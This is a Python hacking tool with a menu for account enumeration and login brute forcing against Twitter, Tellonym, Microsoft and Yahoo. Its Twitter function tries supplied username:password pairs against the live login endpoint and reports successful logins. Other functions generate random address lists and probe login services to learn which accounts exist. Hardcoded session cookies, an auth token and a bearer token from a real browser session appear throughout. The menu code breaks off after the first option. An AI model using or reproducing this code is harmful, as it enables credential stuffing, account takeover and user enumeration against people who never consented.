import random
import requests
import json
import time
import ast
import urllib
from colorama import Fore, init
from bs4 import BeautifulSoup as BS
logo = f'''
\t{Fore.WHITE}   ____   _____ _____ _   _ _______ _____  _____  ______  _____ 
\t  / __ \ / ____|_   _| \ | |__   __|  __ \|  __ \|  ____|/ ____|
\t | |  | | (___   | | |  \| |  | |  | |__) | |__) | |__  | (___  
\t | |  | |\___ \  | | | . ` |  | |  |  _  /|  _  /|  __|  \___ \ 
\t | |__| |____) |_| |_| |\  |  | |  | | \ \| | \ \| |____ ____) |
\t  \____/|_____/|_____|_| \_|  |_|  |_|  \_\_|  \_\______|_____/ 
\t                       {Fore.LIGHTCYAN_EX}       ______                            
\t                       {Fore.LIGHTCYAN_EX}      |______|                           
\t
\t{Fore.LIGHTCYAN_EX}[{Fore.LIGHTYELLOW_EX}00{Fore.LIGHTCYAN_EX}] -{Fore.WHITE} Twitter {Fore.LIGHTBLACK_EX}[Checker/Brute Force] .
\t{Fore.LIGHTCYAN_EX}[{Fore.LIGHTYELLOW_EX}01{Fore.LIGHTCYAN_EX}] -{Fore.WHITE} tellonym checker {Fore.LIGHTBLACK_EX}[Users] . 
\t{Fore.LIGHTCYAN_EX}[{Fore.LIGHTYELLOW_EX}02{Fore.LIGHTCYAN_EX}] -{Fore.WHITE} Email {Fore.LIGHTBLACK_EX}[ Microsoft\Yahoo ] .
\t{Fore.LIGHTCYAN_EX}[{Fore.LIGHTYELLOW_EX}03{Fore.LIGHTCYAN_EX}] -{Fore.WHITE} Random Emails list {Fore.LIGHTBLACK_EX}[@outlook.com \ @yahoo.com] .
\t{Fore.LIGHTCYAN_EX}[{Fore.LIGHTYELLOW_EX}04{Fore.LIGHTCYAN_EX}] -{Fore.WHITE} Random Users list {Fore.LIGHTBLACK_EX}[users] .
\t{Fore.LIGHTCYAN_EX}[{Fore.LIGHTYELLOW_EX}05{Fore.LIGHTCYAN_EX}] - {Fore.WHITE}append combo {Fore.LIGHTBLACK_EX}[Email:Password] . 
'''
userlist = []
Emails = []
init()


def random_Emails(how):

    global Emails
    for i in range(0, how):
        x = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-.12345567890"
        a = random.choice(x)
        b = random.choice(x)
        c = random.choice(x)
        d = random.choice(x)
        e = random.choice(x)
        f = random.choice(x)
        k = random.choice(x)
        v = random.choice(x)
        u = random.choice(x)
        t = i
        #yahoo Domains :
        Yahoo = 'yahoo'
        user_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        user2_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        user3_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        user4_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        user5_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        user6_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        #yahoo more Length Email :
        user7_Yahoo = f"{u}{a}{b}{d}@{Yahoo}.com".strip()
        user8_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        user9_Yahoo = f"{a}{v}{k}{c}{d}@{Yahoo}.com".strip()
        user10_Yahoo = f"{a}{b}{c}{d}{v}@{Yahoo}.com".strip()
        user11_Yahoo = f"{a}{b}{u}{c}{d}@{Yahoo}.com".strip()
        user12_Yahoo = f"{a}{b}{c}{e}@{Yahoo}.com".strip()
        #save in list For Yahoo Domains :
        Emails.append(user_Yahoo)
        Emails.append(user2_Yahoo)
        Emails.append(user3_Yahoo)
        Emails.append(user4_Yahoo)
        Emails.append(user5_Yahoo)
        Emails.append(user6_Yahoo)
        Emails.append(user7_Yahoo)
        Emails.append(user8_Yahoo)
        Emails.append(user9_Yahoo)
        Emails.append(user10_Yahoo)
        Emails.append(user11_Yahoo)
        Emails.append(user12_Yahoo)

        ######################################################################33
        outlook = 'outlook'
        user_outlook = f"{a}{b}{c}{d}@{outlook}.com".strip()
        user2_outlook = f"{a}{b}{c}{d}@{outlook}.com".strip()
        user3_outlook = f"{a}{b}{c}{d}@{outlook}.com".strip()
        user4_outlook = f"{a}{b}{c}{d}@{outlook}.com".strip()
        user5_outlook = f"{a}{b}{c}{d}@{outlook}.com".strip()
        user6_outlook = f"{a}{b}{c}{d}@{outlook}.com".strip()
        #outlook more Length Email :
        user7_outlook = f"{e}{b}{c}{d}@{outlook}.com".strip()
        user8_outlook = f"{a}{f}{c}{d}@{outlook}.com".strip()
        user9_outlook = f"{a}{k}{c}{d}@{outlook}.com".strip()
        user10_outlook = f"{a}{b}{c}{d}{v}@{outlook}.com".strip()
        user11_outlook = f"{b}{u}{c}{d}@{outlook}.com".strip()
        user12_outlook = f"{a}{b}{c}{f}@{outlook}.com".strip()
        #save in list For outlook Domains :
        Emails.append(user_outlook)
        Emails.append(user2_outlook)
        Emails.append(user3_outlook)
        Emails.append(user4_outlook)
        Emails.append(user5_outlook)
        Emails.append(user6_outlook)
        Emails.append(user7_outlook)
        Emails.append(user8_outlook)
        Emails.append(user9_outlook)
        Emails.append(user10_outlook)
        Emails.append(user11_outlook)
        Emails.append(user12_outlook)

    for i in range(0, how):
        x = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-.12345567890"
        a = random.choice(x)
        b = random.choice(x)
        c = random.choice(x)
        d = random.choice(x)
        e = random.choice(x)
        f = random.choice(x)
        k = random.choice(x)
        v = random.choice(x)
        u = random.choice(x)
        t = i
        #yahoo Domains :
        Yahoo = 'yahoo'
        user_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        user2_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        user3_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        user4_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        user5_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        user6_Yahoo = f"{a}{b}{c}{d}@{Yahoo}.com".strip()
        #yahoo more Length Email :
        user7_Yahoo = f"{e}{u}{a}{b}{c}{d}@{Yahoo}.com".strip()
        user8_Yahoo = f"{a}{f}{b}{c}{d}@{Yahoo}.com".strip()
        user9_Yahoo = f"{a}{v}{b}{k}{c}{d}@{Yahoo}.com".strip()
        user10_Yahoo = f"{a}{b}{c}{d}{v}@{Yahoo}.com".strip()
        user11_Yahoo = f"{a}{b}{u}{c}{d}@{Yahoo}.com".strip()
        user12_Yahoo = f"{a}{b}{c}{f}{d}{e}@{Yahoo}.com".strip()
        #save in list For Yahoo Domains :
        Emails.append(user_Yahoo)
        Emails.append(user2_Yahoo)
        Emails.append(user3_Yahoo)
        Emails.append(user4_Yahoo)
        Emails.append(user5_Yahoo)
        Emails.append(user6_Yahoo)
        Emails.append(user7_Yahoo)
        Emails.append(user8_Yahoo)
        Emails.append(user9_Yahoo)
        Emails.append(user10_Yahoo)
        Emails.append(user11_Yahoo)
        Emails.append(user12_Yahoo)

        ######################################################################33
        outlook = 'outlook'
        user_outlook = f"{a}{b}{c}{d}@{outlook}.com".strip()
        user2_outlook = f"{a}{b}{c}{d}@{outlook}.com".strip()
        user3_outlook = f"{a}{b}{c}{d}@{outlook}.com".strip()
        user4_outlook = f"{a}{b}{c}{d}@{outlook}.com".strip()
        user5_outlook = f"{a}{b}{c}{d}@{outlook}.com".strip()
        user6_outlook = f"{a}{b}{c}{d}@{outlook}.com".strip()
        #outlook more Length Email :
        user7_outlook = f"{e}{u}{a}{b}{c}{d}@{outlook}.com".strip()
        user8_outlook = f"{a}{f}{b}{c}{d}@{outlook}.com".strip()
        user9_outlook = f"{a}{v}{b}{k}{c}{d}@{outlook}.com".strip()
        user10_outlook = f"{a}{b}{c}{d}{v}@{outlook}.com".strip()
        user11_outlook = f"{a}{b}{u}{c}{d}@{outlook}.com".strip()
        user12_outlook = f"{a}{b}{c}{f}{d}{e}@{outlook}.com".strip()
        #save in list For outlook Domains :
        Emails.append(user_outlook)
        Emails.append(user2_outlook)
        Emails.append(user3_outlook)
        Emails.append(user4_outlook)
        Emails.append(user5_outlook)
        Emails.append(user6_outlook)
        Emails.append(user7_outlook)
        Emails.append(user8_outlook)
        Emails.append(user9_outlook)
        Emails.append(user10_outlook)
        Emails.append(user11_outlook)
        Emails.append(user12_outlook)


def randomuser(num, how):
    global userlist
    if how == '3':
        while len(userlist) != int(num):
            x = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ12345567890"
            a = random.choice(x)
            b = random.choice(x)
            c = random.choice(x)
            d = random.choice(x)
            v = random.choice(x)
            li = f"{a}{b}{c}".strip()
            userlist.append(li)
    elif how == '4':
        while len(userlist) != int(num):
            x = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ12345567890"
            a = random.choice(x)
            b = random.choice(x)
            c = random.choice(x)
            d = random.choice(x)
            v = random.choice(x)
            li = f"{a}{b}{c}{d}".strip()
            userlist.append(li)
    elif how == '5':
        while len(userlist) != int(num):
            x = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ12345567890"
            a = random.choice(x)
            b = random.choice(x)
            c = random.choice(x)
            d = random.choice(x)
            v = random.choice(x)
            li = f"{a}{b}{c}{d}{v}".strip()
            userlist.append(li)


def tellonym(user, num):

    url = f"https://api.tellonym.me/accounts/check?username={user}"

    headers = {
        'accept':
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-encoding':
        'gzip, deflate, br',
        'accept-language':
        'en-US,en;q=0.9',
        'cache-control':
        'no-cache',
        'cookie':
        '__cfduid=d84cd52882a3d7940ce3af515bd0de2a51606742523; _ga=GA1.2.1090240656.1608713173; _gid=GA1.2.662517599.1608713173',
        'pragma':
        'no-cache',
        'sec-fetch-dest':
        'document',
        'sec-fetch-mode':
        'navigate',
        'sec-fetch-site':
        'none',
        'sec-fetch-user':
        '?1',
        'upgrade-insecure-requests':
        '1',
        'user-agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    }
    r = requests.session()
    try:

        response = r.get(url=url, headers=headers)

        if response.json()['username'] == 'true' or response.json(
        )['username'] == True:
            print("\t", f"{Fore.WHITE}[{num}]", Fore.CYAN,
                  f"Available :{Fore.WHITE} [ {user} ]")
        elif response.json()['username'] == 'false' or response.json(
        )['username'] == False:
            print("\t", f"{Fore.WHITE}[{num}]", f"{Fore.RED}Taken : {user}")
        else:
            pass
    except:
        print("\t", f"{Fore.WHITE}[{num}]", Fore.LIGHTMAGENTA_EX,
              f"[Error ]  : {user}")


#Twiitter :
def Twitter(username, password):

    username = f"{username}".strip()
    password = f"{password}".strip()
    headers = {
        "Host":
        "twitter.com",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
        "Accept":
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language":
        "en-US,en;q=0.5",
        "Accept-Encoding":
        "gzip, deflate",
        "Content-Type":
        "application/x-www-form-urlencoded",
        "Content-Length":
        "883",
        "Referer":
        "https://twitter.com/login/error?username_or_email=iidaxe&redirect_after_login=%2F",
        "Origin":
        "https://twitter.com",
        "Upgrade-Insecure-Requests":
        "1",
        "Connection":
        "close",
        "Cookie":
        "guest_id=v1%3A160786096844426536; ct0=f375ba25d23212fb4875567c78c85559; gt=1338092020984901634; _ga=GA1.2.1757115354.1607860959; _gid=GA1.2.2074901737.1607860959; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCNp5%252B1t2AToMY3NyZl9p%250AZCIlYTg4NjkyM2Y4ZjliYTRlNDI0YjY5YjUzNjEzN2IzYTg6B2lkIiVkY2Yy%250AOWIwMjdiMzAxZTBlNjk0ZTJhMzY4YjU2OWU0OQ%253D%253D--8586ae21dab33b86cdad030cbbc67d2b03f8df5c; att=1-GRKaX6DWZrfQzzJwXXLohfAmj0D0f5qOvufFk8KZ; _mb_tk=2a0641b03d3b11eba7aa792fdc775b8f",
    }
    data = f"redirect_after_login=%2F&remember_me=1&authenticity_token=2a0641b03d3b11eba7aa792fdc775b8f&wfa=1&ui_metrics=%7B%22rf%22%3A%7B%22b483b1f0d0fe7378b331b266e8cbeb10ce3f5aea97ab042b54c1d2416a4af874%22%3A0%2C%22bf29327ec04978cb62efef16fb4538e6adb77ad78e1d5b9d62c7f10812fdfb5f%22%3A-1%2C%22aa62df073e0d7a51c13b3f3ac348d75e007bbd612758f874b32fc7555ecbb471%22%3A150%2C%22af46abee465456dbc806def3cc464d73d4b7f9d8c00cbdfee9f1b09e75f7f6c0%22%3A137%7D%2C%22s%22%3A%22Y86C51hSlv_kHr2zmqlncZyjJUatsodm525qJqxL7Kzvcb3q_tnc60l7JwQlPn4uz3GLMAPXcPFKAN9aFSLyblTsZOMDUkKWa-R2eRNSr8QiK6bg2nGQ2H5hrpb_asadnCw6ZsE9bR9XW9tl0I4ruGKHA2DvJqQl4WPN4KLe2gV3zeGTdzxSHJlQtBzBekKY3hSzRzG__kO5knt3A5VEJLtijzOSc8WrN2iUupsY3RjdfjAryXRbkECo4xa9t0ApdrI6qugeLe2kjtXJc004b151n62kdkBVV3To29HkWRPugT1l1suV06lfth8zomhoT4HnPwuU4ZogMBbfMSAtRQAAAXZb--U_%22%7D&session%5Busername_or_email%5D={username}&session%5Bpassword%5D={password}"
    url = 'https://twitter.com/sessions'
    response = requests.post(url=url,
                             headers=headers,
                             data=data,
                             allow_redirects=False)

    Soup = BS(response.text, 'html.parser')
    fin = Soup.find('a', href=True)
    error = "https://twitter.com/login?username_disabled=true&redirect_after_login=%2F"
    error2 = f"https://twitter.com/login/error?username_or_email={username}&redirect_after_login=%2F"
    #print(error)

    if fin['href'] == "https://twitter.com/":
        print(f"\t{Fore.CYAN}[ LOGIN ] {username}:{password}")
    elif fin['href'] == error or fin['href'] == error2:
        print(f"\t{Fore.RED}[ERR0R] {username}:{password}")


def Twitter_Chacker(user, NUM):

    try:

        url = f'https://twitter.com/i/api/i/users/username_available.json?suggest=true&username={user}'

        headers = {
            "Host":
            "twitter.com",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
            "Accept":
            "*/*",
            "Accept-Language":
            "en-US,en;q=0.5",
            "Accept-Encoding":
            "gzip, deflate",
            "x-twitter-auth-type":
            "OAuth2Session",
            "x-twitter-client-language":
            "en",
            "x-twitter-active-user":
            "yes",
            "x-csrf-token":
            "cc9b8edde39ad72c276665eb2951e727afef1d218adadfb556466f77a9565a29f3b847005f1149a11aa5ef0e9330d070103f109dd88d8942da86bf5ea8b3cc5de55b70667e30dffe22e04fe1057fef85",
            "authorization":
            "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
            "Referer":
            "https://twitter.com/settings/screen_name",
            "Connection":
            "close",
            "Cookie":
            'personalization_id="v1_DSGX0r+19D/zIeKBfTgN3w=="; guest_id=v1%3A160865446853580759; gt=1341420212755816449; ct0=cc9b8edde39ad72c276665eb2951e727afef1d218adadfb556466f77a9565a29f3b847005f1149a11aa5ef0e9330d070103f109dd88d8942da86bf5ea8b3cc5de55b70667e30dffe22e04fe1057fef85; _ga=GA1.2.1764613764.1608654458; _gid=GA1.2.1117030737.1608654458; _twitter_sess=BAh7DCIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCHNXR4t2AToMY3NyZl9p%250AZCIlYjExMDZhN2JmMmVlZWViYjk5ZDJiOWQ4Yzg5YmE0MGM6B2lkIiUzZGVk%250AYzk5MjUyNDFjZmM4ODAxNGMzODNiZGQyNDMwZDoJdXNlcmwrCQJglz6afZcS%250AOh9sYXN0X3Bhc3N3b3JkX2NvbmZpcm1hdGlvbiIVMTYwODY1NDUyMDM0MzAw%250AMDoecGFzc3dvcmRfY29uZmlybWF0aW9uX3VpZCIYMTMzOTY3NzUxNTU5NDU1%250ANTM5NA%253D%253D--0048a961b08b4ffdfbb98a3f697a475e1c9d1b8a; ads_prefs="HBERAAA="; kdt=UB5SOJCj2kzd5D5l6G8qgqoO0TXtyIEM2qV7gtQn; remember_checked_on=1; twid=u%3D1339677515594555394; auth_token=d1eb8167a2caa58a0798e41d0851419c2fe6b7ac'
        }
        response = requests.get(url=url, headers=headers)

        if response.json()["valid"] == 'true' or response.json(
        )['reason'] == 'available':
            print("\t", Fore.WHITE, f"[ {NUM} ]", user, Fore.CYAN,
                  response.json()['valid'])
        else:
            print("\t", Fore.RED, f"[ {NUM} ]", user,
                  response.json()['reason'])
    except:
        pass


class Email_Chacker:
    def scan_Outlook(Email):
        headers = {
            "Host":
            "login.live.com",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
            "Accept":
            "application/json",
            "Accept-Language":
            "en-US,en;q=0.5",
            "Accept-Encoding":
            "gzip, deflate",
            "Referer":
            "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1607277097&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d22408b7b-f980-29ce-604a-dc6381a86d21&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015",
            "hpgid":
            "33",
            "hpgact":
            "0",
            "client-request-id":
            "1e2503db4a36419384226b8e4ed01ab3",
            "Content-type":
            "application/json; charset=utf-8",
            "Content-Length":
            "658",
            "Origin":
            "https://login.live.com",
            "Connection":
            "clos",
            "Cookie":
            "uaid=1e2503db4a36419384226b8e4ed01ab3; MSPRequ=id=292841&lt=1607483511&co=1; MSCC=86.97.14.238-AE; OParams=11DcEDKdl2UluVZsX2oma7Mz5Pm19B9JMOGEEbQCrsbIc*ulAKnDW!Rs*lO26uACBtFMfsKXNw8UMHu7G4IOoDP3Xu9ka!xcoOW*caVdtnEtr24ReUYcT*ZLrT1lQHHeux!A6P6mrjTImz0de7s1VeyyebTFxJdkVSDGg2D2QaJf5tJRGVowVqbKIs3ysylwWOMc!kz5txEIkJwe6KllaIpK46aMrC1AMMK8nAV2d4qZzmBjtcGDO511neVw!qqKtxsJCMAQgft!uH0NBC4YtgCWsQKRPjbptWodPXIBH9jv0C*due0QOOVLj3t!ee7b7Z*r8lZd1H3mhHKDiegnfUiWcbBptQ0a2T67u7lI*qMB1Uq9dOA98rFJQIzqRY1mUzq668SIzZhP9baBHEKEPchIP5sCjY3y9DcQ6uQdSoGl!V2s3IIOMc*gVfrksSO8y7*gqPRFj9s*K2jjYfvwKdkHaVjAGJV2GV1smUuEKRokHQsCF8H4achF!atmWaZuQl*LedAIBZvFGZYIWxZyZz3T0$; MSPOK=$uuid-1573d63f-6556-4ccd-8797-1c811745a29c$uuid-c00dcaa1-7932-4ff1-afd2-8d2ef630642c"
        }

        jsons = str({
            "username":
            str(Email),
            "uaid":
            "1e2503db4a36419384226b8e4ed01ab3",
            "isOtherIdpSupported":
            1,
            "checkPhones":
            0,
            "isRemoteNGCSupported":
            1,
            "isCookieBannerShown":
            0,
            "isFidoSupported":
            0,
            "forceotclogin":
            0,
            "otclogindisallowed":
            0,
            "isExternalFederationDisallowed":
            0,
            "isRemoteConnectSupported":
            0,
            "federationFlags":
            3,
            "isSignup":
            0,
            "flowToken":
            "DZyqz!BifSqCy4O*KSHcM5bV852h8sAfAZR2onJacExMLg*6sRuNgcIeiPewol*b7lXEj*ase6XtIXfcKVM20P7pMNvWQwXD8dsS4qwzU*2dvgsEq3RaOriKiqLCLI9NDkoRRhc3VtXvHMDMwGcSFx!PzBg5hONN5JAhfKUPiXsKNmkCGuERh6uYjtr5QPz8YV6CyDU4d8DkNKTMuRpIXQIcRWqlfQzrm6TeKGplLaqGXmjBxMVPboY0gmqaBT4SVkm0PZoU6wqPkuxcIvEOLtY$"
        })

        jsonn = json.dumps(ast.literal_eval(jsons), separators=(',', ':'))

        url = "https://login.live.com/GetCredentialType.srf?opid=317D5CCC0D224EE7&id=292841&uiflavor=web&wa=wsignin1.0&rpsnv=13&ct=1607277097&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d22408b7b-f980-29ce-604a-dc6381a86d21&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&vv=1600&mkt=EN-US&lc=1033&uaid=1e2503db4a36419384226b8e4ed01ab3"
        try:
            req = requests.post(url=url, headers=headers, data=jsonn)
            jsonResponse = req.json()
            if jsonResponse['IfExistsResult'] == 0:
                print("", '\t', Fore.RED, "Take : ", Fore.LIGHTYELLOW_EX,
                      f"{Email}".strip(), Fore.LIGHTBLACK_EX, "[ Microsoft ]")
            elif jsonResponse['IfExistsResult'] == 1:
                print('\t', Fore.CYAN, "Allow ", ":", Fore.LIGHTGREEN_EX,
                      f"{Email}".strip(), Fore.LIGHTBLACK_EX, "[ Microsoft ]")

            else:
                pass
        except:
            pass

    def Scan_Yahoo(Email):
        Email = urllib.parse.quote(Email)
        headers = {
            "Host":
            "login.yahoo.com",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
            "Accept":
            "*/*",
            "Accept-Language":
            "en-US,en;q=0.5",
            "Accept-Encoding":
            "gzip, deflate",
            "Referer":
            "https://login.yahoo.com/?.src=fpctx&.intl=xe&.lang=en-AE&.done=https://en-maktoob.yahoo.com&pspid=2143434596",
            "content-type":
            "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":
            "XMLHttpRequest",
            "Content-Length":
            "1479",
            "Origin":
            "https://login.yahoo.com",
            "Connection":
            "close",
            "Cookie":
            "AS=v=1&s=1GhWtzXc&d=A5fd1da86|2LZIu7T.2SJrb.YsXVP1fGCYU7PQsGzoTRA2oOTjn4Q811DqJgwb1vlCF1GOviQ6eIg7bRjQvnP5vMLFr118_2sXRZEH_1l0dtHEMRB0MDsTR0GAm_GagSft.WJEqnLhqlWBQtMVP23dRoc7a2.RdCllWYt_0eSEkZM.93q6fq957wKgtllwpoyldb39_cD226HlKhYeHZZn1gMOB3iOtDALlRAHWlMHTn3An93i0AH7WhXFSo2A6hc9UR96W7KvMnSiyqwD66riol52HppOJye0BXsHz_MioOF7dOA7BgB4zScbpauXrOJPIYCoBM0l8L9.QYiRBpiSrm5M8dgGHzLyrGq.k5tqb1kD1h_la4Px0gds3Mw_w8A7hWZwYNA.jXZEZs_UZLKsEgoWzicWe8CLfG73qz62ayGVn7S2WqiNbVauN7v.XouCI3R2ktCl8_g4wxwVTlAjm3yzRijYslrvjyQZt1k.Vm3ZQ5UNWPaaT7eniiXAYiQR59YHfBx8Dr_57qlanCKebimgDpOjMfHQdZ5y.hlkt_dBUfTISwpuVX4OpSZ9Wjr28Zk7nlw5XpxqmH78hPXx9ojPJE0EjGSHA2tRHlwQmtNZG049gnRb1N0.ipJNYXqyZAHiKrfWfNDwiEJygmsdiFVMz90mb_OoI3dyBbmVoL2rohggJr4alhwBkUivQBjMWIOu0HeVYYhkbUWOwHlQuDxTlJ__lqlp.tVknh.El8n5KMoze_lcnpHHloDM4QVVhwZmFnvHjdpKsCfsx9x2IMzGQge6X7bslNtW.8qCBl60Kll0mWdoGxdH7h_3HP309ot2xsmuSMMFfr80L4eNKr4qj0HAG0MsEuN_8lES4BIAaCT8iLQ3O9.3PvdygPwMl.2Hy6STQb.P_N7jDxd4DpLc_0jba0Ci6d8Y0VfiXt31ukCl~A|B5fd1dcdc|CSYhGlL.2SrdUi9M5yhJ76RgQlFX19n89qCZqnT7gZc1eBN9NpUTeszfjpZ2ptDMStio5DYYNPK9RLUkzC9uJm6ICGrOZDxtcMZ2qzcE.duRmohJG_yo7nh2.9AxqugaAL4czYpwkZhTar4DxCIEnhhHotNovDxXh5OM1wLSYSmIzGNgwjGsdjoNzYo8C6Copv0Vm0Ku9CgrjduaFfwy29m2YfnL_gfmY4Y9lYPSOxEnOqcEs0xs1GtxloBcWVmjs4nZhiyRW9Mf_l.Bs.oixufUkiTqbR_A42ya0rPtTS0zhwJXLMvC2660zu7Fahsz78ZzA71ueMf_VpTKTk_RNoM33YyY1pX_qiW_2lVlmBFN5RIl9inB2tqV31oKbwnfVELZiULWZc21TCH0nKLmsTBUHUY5NGJFIei_XtxxZF7zG3SaF7adHRU4rsR69YsJr681THYIN8eZDWDcZqBICqkWffviSQKO2VhQxPrmhIlPkn1bgB82.uWNu6zx7zjneRLEj95qYM.172FrVUrqM7L8KQ_fI5Q9EuufOZAnypCawbCDe03UOq2mzbGb17JlnqYI_o06Z3Bimdz5fpnz0ybvpWSooFFIpBQeXd.SIfHUQeKw7v.3n5DUxTMB4bsg_dp9tt0b1SC97nhXrTqCO_kxFnngv2aqzKyTuWxlWCt3h8KNyULKX6nQYcLuDmnE7RDPYDf6d5lEvMA0ycwBYPZv9CTb7IyuLRalrsTYxlnKxIj3y.5yD0yaEA7yQyPuOrfv6m5Szl9AKnm7xEEklZR0yALEJqAZueL0H6h29APTDJgRORJHxak0Nl9_0kXpIMik49Og1jpoganwBmQ9Ysy_o9IckRDweUXpFuoKSfGTDKsgp1PQ24uk.F76nkpq1c5zpZjzmv66oMCn.QzqjOuSAXfZHcaCmipLpdIit1i9_nxl0PyB~A; A1=d=AQABBAIOzV8CEA8aL3Kv6eYQAoRmxwtWDkoFEgEBAQFfzl_WXwAAAAAA_SMAAAcIAg7NXwtWDko&S=AQAAArVEZD2b3d_LPgUW7IxSxqY; A3=d=AQABBAIOzV8CEA8aL3Kv6eYQAoRmxwtWDkoFEgEBAQFfzl_WXwAAAAAA_SMAAAcIAg7NXwtWDko&S=AQAAArVEZD2b3d_LPgUW7IxSxqY; A1S=d=AQABBAIOzV8CEA8aL3Kv6eYQAoRmxwtWDkoFEgEBAQFfzl_WXwAAAAAA_SMAAAcIAg7NXwtWDko&S=AQAAArVEZD2b3d_LPgUW7IxSxqY&j=WORLD; B=4k3im1dfsq3g2&b=3&s=ue; GUC=AQEBAQFfzl9f1kIeGQRU"
        }
        data = f"browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A%22unknown%22%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-240%2C%22timezone%22%3A%22Asia%2FDubai%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unspecified%22%2C%22plugins%22%3A%7B%22count%22%3A1%2C%22hash%22%3A%22ad4b8b8f61cc727bced755bf25523c5c%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.~ANGLE%20(Intel(R)%20HD%20Graphics%20620%20Direct3D11%20vs_5_0%20ps_5_0)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A50%2C%22hash%22%3A%22afe1ffb1d849424cf961b580581f096e%22%7D%2C%22audio%22%3A%2235.7383295930922%22%2C%22resolution%22%3A%7B%22w%22%3A%221366%22%2C%22h%22%3A%22768%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22768%22%2C%22h%22%3A%221366%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1607502684191%2C%22render%22%3A1607502671921%7D%7D&crumb=4gu2GfPg5fA&acrumb=1GhWtzXc&sessionIndex=Qg--&displayName=&deviceCapability=%7B%22pa%22%3A%7B%22status%22%3Afalse%7D%7D&username={Email}&passwd=DtzVT288mcvU4Br&signin=Next&persistent=y"
        url = 'https://login.yahoo.com/?.src=fpctx&.intl=xe&.lang=en-AE&.done=https://en-maktoob.yahoo.com&pspid=2143434596'
        try:

            response = requests.post(url=url, headers=headers, data=data)

            if len(response.json()) == 5:
                print('\t', Fore.CYAN, "Allow ", ":", Fore.LIGHTGREEN_EX,
                      f"{urllib.parse.unquote(Email)}".strip(),
                      Fore.LIGHTBLACK_EX, "[ Yahoo ]")
            elif len(response.json()) == 1:
                print('\t', Fore.RED, "Allow : ", Fore.LIGHTYELLOW_EX,
                      f"{urllib.parse.unquote(Email)}".strip(),
                      Fore.LIGHTBLACK_EX, "[ Yahoo ]")
        except:
            pass


print(logo)
chooses = input("\tEnter : ").strip()

if chooses == '00':
    #twitter
    print('''
    \t[01] checker 
    \t[02] brute force 
    ''')
    what = input("\tchose :").strip()

    if what == '01':
        lists = input("\tEnter list users : ")
        openlist = open(lists, 'r').readlines()
        print("")
        i = 0
        for users in openlist:
            i += 1
            user = f"{users}".strip()
            Twitter_Chacker(user, i)
